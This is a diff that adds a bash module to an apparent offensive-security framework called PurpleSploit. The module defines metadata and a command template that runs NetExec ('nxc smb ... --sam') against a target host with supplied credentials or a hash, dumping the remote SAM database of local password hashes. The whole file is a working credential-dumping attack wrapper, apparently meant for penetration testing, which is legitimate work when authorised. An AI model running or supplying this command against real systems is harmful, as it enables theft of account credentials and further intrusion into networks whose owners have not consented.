@@ -1,0 +1,13 @@
+#!/bin/bash
+# NXC SMB SAM Dump Module
+
+MODULE_NAME="network/nxc/smb/dump_sam"
+MODULE_CATEGORY="network"
+MODULE_DESCRIPTION="Dump SAM database from target system"
+MODULE_AUTHOR="PurpleSploit Team"
+MODULE_TOOL="nxc"
+
+REQUIRED_VARS="RHOST,USERNAME"
+OPTIONAL_VARS="PASSWORD:,DOMAIN:,HASH:"
+
+COMMAND_TEMPLATE="nxc smb \${RHOST} -u \${USERNAME} -p '\${PASSWORD}' \${DOMAIN:+-d \$DOMAIN} \${HASH:+-H \$HASH} --sam"
